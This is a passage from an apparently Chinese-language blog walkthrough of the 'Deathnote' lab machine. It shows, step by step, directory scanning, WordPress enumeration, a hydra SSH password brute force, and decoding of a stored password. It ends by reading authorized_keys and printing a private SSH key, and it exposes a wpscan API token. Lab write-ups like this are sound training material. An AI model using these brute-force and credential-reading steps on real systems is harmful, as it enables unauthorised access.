class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htm.php</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.html</span>      (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswds</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.php</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.wbpg</span>      (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.jpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htgroup</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htgroup.html</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htgroup.wbpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htgroup.jpg</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htgroup.php</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/wp-forum.phps</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.php</span>    (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.jpg</span>    (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.html</span>   (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.wbpg</span>   (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htuser.php</span>          (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htuser.html</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htuser</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htuser.jpg</span>          (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htuser.wbpg</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.ht</span>                  (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.ht.html</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htc.html</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.ht.php</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htc</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.ht.jpg</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.ht.wbpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htc.wbpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htc.php</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htc.jpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="params">Progress:</span> <span class="number">81220</span> <span class="symbol">/</span> <span class="number">81225</span> (<span class="number">99.99</span>%)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Finished</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl 192.168.179.40/robots.txt                </span></span><br><span class="line">fuck <span class="keyword">it</span> <span class="keyword">my</span> dad </span><br><span class="line">added hint <span class="keyword">on</span> /important.jpg</span><br><span class="line"></span><br><span class="line">ryuk please delete <span class="keyword">it</span></span><br></pre></td></tr></table></figure></div>
<p>这里有提示，提示在&#x2F;important.jpg 而且有一个疑似用户ryuk<br>直接在web访问这个路径会显示不出任何东西，只有一个错误图片的标志，但是用curl访问有显示文字</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl http://192.168.179.40/important.jpg</span></span><br><span class="line">i am Soichiro Yagami, light&#x27;s father</span><br><span class="line">i have a doubt <span class="keyword">if</span> L <span class="keyword">is</span> <span class="literal">true</span> <span class="keyword">about</span> <span class="keyword">the</span> assumption <span class="keyword">that</span> light <span class="keyword">is</span> kira</span><br><span class="line"></span><br><span class="line">i can only help you <span class="keyword">by</span> giving something important</span><br><span class="line"></span><br><span class="line">login username : user.txt</span><br><span class="line">i don&#x27;t know <span class="keyword">the</span> password.</span><br><span class="line">find <span class="keyword">it</span> <span class="keyword">by</span> yourself </span><br><span class="line"><span class="keyword">but</span> i think <span class="keyword">it</span> <span class="keyword">is</span> <span class="keyword">in</span> <span class="keyword">the</span> hint section <span class="keyword">of</span> site</span><br></pre></td></tr></table></figure></div>
<p>那就熟悉了哈哈哈 light和L是我知道的人名。 这里提示登录的用户名user.txt，密码在hint section<br>刚才目录还有扫出一个index.html 现在去看看,但是访问不了，又跳转到一个不知道的url<br>提示在hint部分，再访问一下192.168.179.40&#x2F;hint , 没有。&#x2F;important&#x2F;hint 没有。<br>这里我看住了，看了下群主ll104567的视频，发现我的思路有点问题，确实有用到wordpress，<br>根据直接访问的结果，要修改一下hosts文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.40                  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1; url=&#x27;http://deathnote.vuln/wordpress&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">cente</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please wait.....<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><code>192.168.179.40 deathnote.vuln</code></p>
<p><img src="https://pic1.imgdb.cn/item/67aac252d0e0a243d4fe3e55.png"><br>帅<br><img src="https://pic1.imgdb.cn/item/67aac3abd0e0a243d4fe3f3b.png"><br>这个my fav line is iamjustic3 一定有用，不然不会放在这里<br>现在再用wpscan扫一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># wpscan --api-token r4NahZxa7hHyx6tcZVYdfivP0YNXqmTaJXwqgMatwmE  --enumerate u,vp --plugins-detection aggressive --url http://deathnote.vuln/wordpress</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|<span class="string"></span></span><br><span class="line"><span class="string">          \ \  /\  / /</span>|<span class="string"> </span>|<span class="string">__) </span>|<span class="string"> (___   ___  __ _ _ __ ®</span></span><br><span class="line"><span class="string">           \ \/  \/ / </span>|<span class="string">  ___/ \___ \ / __</span>|<span class="string">/ _` </span>|<span class="string"> &#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  </span>|<span class="string"> </span>|<span class="string">     ____) </span>|<span class="string"> (__</span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">             \/  \/   |<span class="string">_</span>|<span class="string">    </span>|<span class="string">_____/ \___</span>|<span class="string">\__,_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.27</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       <span class="meta">@_WPScan_,</span> <span class="meta">@ethicalhack3r,</span> <span class="meta">@erwan_lr,</span> <span class="meta">@firefart</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://deathnote.vuln/wordpress/wp-content/uploads/</span><br><span class="line"> |<span class="string"> Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
<p>找到了一个文件上传的地址，去看看，这里可以查看文件<br><img src="https://pic1.imgdb.cn/item/67aad515d0e0a243d4fe42ae.png"><br><img src="https://pic1.imgdb.cn/item/67aad51ed0e0a243d4fe42af.png"><br>如果在hint目录下直接看源码也能发现这个路径<br><img src="https://pic1.imgdb.cn/item/67aac706d0e0a243d4fe4050.png"><br>在这里找到了user.txt 和 note.txt user.txt肯定是用户名，但是note不一定是密码<br>先用hydra爆破一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -L <span class="keyword">user</span>.txt -P note.txt ssh://<span class="number">192.168</span><span class="number">.179</span><span class="number">.40</span></span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">22</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Many SSH configurations <span class="keyword">limit</span> the number <span class="keyword">of</span> parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">731</span> <span class="keyword">login</span> tries (l:<span class="number">17</span>/p:<span class="number">43</span>), ~<span class="number">46</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.179</span><span class="number">.40</span>:<span class="number">22</span>/</span><br><span class="line">[STATUS] <span class="number">280.00</span> tries/min, <span class="number">280</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">453</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">00</span>:<span class="number">02</span>h, <span class="number">14</span> active</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.179</span><span class="number">.40</span>   <span class="keyword">login</span>: l   <span class="keyword">password</span>: death4me</span><br><span class="line">[STATUS] <span class="number">283.00</span> tries/min, <span class="number">566</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">02</span>h, <span class="number">167</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">14</span> active</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">03</span></span><br></pre></td></tr></table></figure></div>
<p>成功拿到用户名和密码<br>登录l的shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># ssh l@192.168.179.40    </span></span><br><span class="line">l@<span class="number">192.168</span><span class="number">.179</span><span class="number">.40</span>&#x27;s password: </span><br><span class="line">Linux deathnote <span class="number">4.19</span><span class="number">.0</span><span class="number">-17</span>-amd64 <span class="comment">#1 SMP Debian 4.19.194-2 (2021-06-21) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> <span class="keyword">the</span> Debian GNU/Linux system are free software;</span><br><span class="line"><span class="keyword">the</span> exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> <span class="keyword">the</span></span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> <span class="keyword">the</span> extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sat Sep  <span class="number">4</span> <span class="number">06</span>:<span class="number">12</span>:<span class="number">29</span> <span class="number">2021</span> <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.6</span></span><br><span class="line">l@deathnote:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> l: </span><br><span class="line">Sorry, user l may <span class="keyword">not</span> <span class="built_in">run</span> sudo <span class="keyword">on</span> deathnote.</span><br><span class="line">l@deathnote:~$ </span><br></pre></td></tr></table></figure></div>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>刚刚看了没有sudo，再去看看suid，也没有什么</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">l<span class="variable">@deathnote</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/umount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br></pre></td></tr></table></figure></div>
<p>家目录有个user.txt 是Brainfuck 加密，解密之后内容是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line"><span class="comment">&#x27;i think u got the shell , but you wont be able to kill me -kira&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>但是只有一句挑衅的话，没有其他内容<br>下面因为sudo和suid都用不了,而且&#x2F;home目录下还有一个kira用户，所以肯定还要先得到kira<br>那就找一下l的文件，但是属于l的文件太多了，我就找名字是l的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">l@deathnote:~$ <span class="keyword">find</span> <span class="regexp">/ -name &quot;l&quot; 2&gt;/</span>dev/<span class="keyword">null</span></span><br><span class="line"><span class="regexp">/home/</span>l</span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/terminfo/</span>l</span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/terminfo/</span>l</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/sudo/</span>lectured/l</span><br><span class="line"></span><br><span class="line">l@deathnote:~$ <span class="keyword">find</span> <span class="regexp">/ -name &quot;L&quot; 2&gt;/</span>dev/<span class="keyword">null</span></span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/terminfo/</span>L</span><br><span class="line"><span class="regexp">/opt/</span>L</span><br></pre></td></tr></table></figure></div>
<p>发现一个可疑的文件&#x2F;opt&#x2F;L</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L</span><span class="variable">$ </span>ls</span><br><span class="line">fake-notebook-rule  kira-<span class="keyword">case</span></span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L</span><span class="variable">$ </span>cd fake-notebook-rule/</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/fake-notebook-rule</span><span class="variable">$ </span>ls</span><br><span class="line"><span class="keyword">case</span>.wav  hint</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/fake-notebook-rule</span><span class="variable">$ </span>file hint</span><br><span class="line"><span class="symbol">hint:</span> <span class="variable constant_">ASCII</span> text</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/fake-notebook-rule</span><span class="variable">$ </span>cat hint </span><br><span class="line">use cyberchef</span><br><span class="line"></span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/fake-notebook-rule</span><span class="variable">$ </span>cat <span class="keyword">case</span>.wav </span><br><span class="line"><span class="number">63</span> <span class="number">47</span> <span class="number">46</span> 7a <span class="number">63</span> <span class="number">33</span> <span class="number">64</span> 6b <span class="number">49</span> <span class="number">44</span> 6f <span class="number">67</span> <span class="number">61</span> <span class="number">32</span> 6c <span class="number">79</span> <span class="number">59</span> <span class="number">57</span> 6c 7a 5a <span class="number">58</span> 5a <span class="number">70</span> <span class="number">62</span> <span class="number">43</span> <span class="number">41</span> 3d</span><br></pre></td></tr></table></figure></div>
<p>果然有用，去cyberchef解密一下<br>先用from hex解密出一个base64编码，再用base64解密</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">passwd : <span class="type">kiraisevil</span> </span><br></pre></td></tr></table></figure></div>
<p>另一个文件是一个日记</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/kira-case</span><span class="variable">$ </span>cat <span class="keyword">case</span>-file.txt </span><br><span class="line">the <span class="title class_">FBI</span> agent died on <span class="title class_">December</span> <span class="number">27</span>, <span class="number">2006</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> week <span class="keyword">after</span> the investigation of the task-force member/head.</span><br><span class="line">aka.....</span><br><span class="line"><span class="title class_">Soichiro</span> <span class="title class_">Yagami</span><span class="string">&#x27;s family .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hmmmmmmmmm......</span></span><br><span class="line"><span class="string">and according to watari ,</span></span><br><span class="line"><span class="string">he died as other died after Kira targeted them .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">and we also found something in </span></span><br><span class="line"><span class="string">fake-notebook-rule folder .</span></span><br></pre></td></tr></table></figure></div>
<p>死亡笔记的规则哈哈哈哈，看过这个动漫的知道这个梗，原来这就是deathnote的使用方法哈哈哈哈<br>现在有了kira的密码就切换到kira用户<br>看了群主ll104567的视频，发现还有另一种思路可以切换到kira</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/kira-case</span><span class="variable">$ </span>cd /home</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home</span><span class="variable">$ </span>ls</span><br><span class="line">kira  l</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home</span><span class="variable">$ </span>cd kira</span><br><span class="line"></span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home/kira</span><span class="variable">$ </span>ls -al</span><br><span class="line">total <span class="number">36</span></span><br><span class="line">drwxr-xr-x <span class="number">4</span> kira kira <span class="number">4096</span> <span class="title class_">Sep</span>  <span class="number">4</span>  <span class="number">2021</span> .</span><br><span class="line">drwxr-xr-x <span class="number">4</span> root root <span class="number">4096</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> ..</span><br><span class="line">-rw------- <span class="number">1</span> kira kira   <span class="number">39</span> <span class="title class_">Feb</span> <span class="number">10</span> <span class="number">23</span><span class="symbol">:</span><span class="number">48</span> .bash_history</span><br><span class="line">-rw-r--r-- <span class="number">1</span> kira kira  <span class="number">220</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> kira kira <span class="number">3526</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> .bashrc</span><br><span class="line">-rwx------ <span class="number">1</span> kira root   <span class="number">85</span> <span class="title class_">Aug</span> <span class="number">29</span>  <span class="number">2021</span> kira.txt</span><br><span class="line">drwxr-xr-x <span class="number">3</span> kira kira <span class="number">4096</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> .local</span><br><span class="line">-rw-r--r-- <span class="number">1</span> kira kira  <span class="number">807</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> .profile</span><br><span class="line">drwxr-xr-x <span class="number">2</span> kira kira <span class="number">4096</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> .ssh</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home/kira</span><span class="variable">$ </span>cd .ssh</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home/kira/</span>.ssh<span class="variable">$ </span>ls</span><br><span class="line">authorized_keys</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home/kira/</span>.ssh<span class="variable">$ </span>cat authorized_keys </span><br><span class="line">ssh-rsa <span class="title class_">AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3</span>/<span class="title class_">Jy93n0NfPqOX7HGkLBasYR0v</span>/<span class="title class_">IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj</span>/<span class="number">6</span>vBi+wMyFF3jQhP4Su72ssLH1n/<span class="title class_">E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k</span>/<span class="title class_">POyhURC6MW0V</span>/aQICFZ6z l<span class="variable">@deathnote</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这个authorized_keys 公钥是l的,那就可以用l的私钥登录kira用户了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">l@deathnote:~<span class="operator">/</span>.ssh$ ls</span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">l@deathnote:~<span class="operator">/</span>.ssh$ cat id_rsa</span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEA8olvOzliq1dCltd3iliYq<span class="operator">+</span>fIU<span class="symbol">/CGwumetUmTYeGM5vV5X03AsrQx</span></span><br><span class="line"><span class="operator">+</span>eroQzqrTEeo1c7PagklxkBS4XOiDDxevWDIivck1OWoU<span class="symbol">/C5nztDm6kn0gBh2ktIuQO96c</span></span><br><span class="line">ZalExx684Qd<span class="symbol">/ycvd59DXz6jl+xxpCwWrGEdL/yK3ke+IogSNCbHg8cq2Qi3JeofVdFolNJ</span></span><br><span class="line">o2zzQRjn38<span class="operator">+</span>NQiTe<span class="symbol">/MtmFwblJYjgI/+rwYvsDMhRd40IT+Eru9rLCx9Z/xNhwYpg9Be+Zo</span></span><br><span class="line">uixPUjbiOjYr2yVFmRa320ITdhUrCB57qCyCUH7hWbELSbAUPXd8r0w9pPzzsoVEQujFtF</span><br><span class="line">f2kCAhWeswAAA8gGaU36BmlN<span class="operator">+</span>gAAAAdzc2gtcnNhAAABAQDyiW87OWKrV0KW13eKWJir58</span><br><span class="line">hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU</span><br><span class="line"><span class="number">5</span>ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3<span class="symbol">/Jy93n0NfPqOX7HGkLBasYR0v/IreR</span></span><br><span class="line"><span class="number">74</span>iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj<span 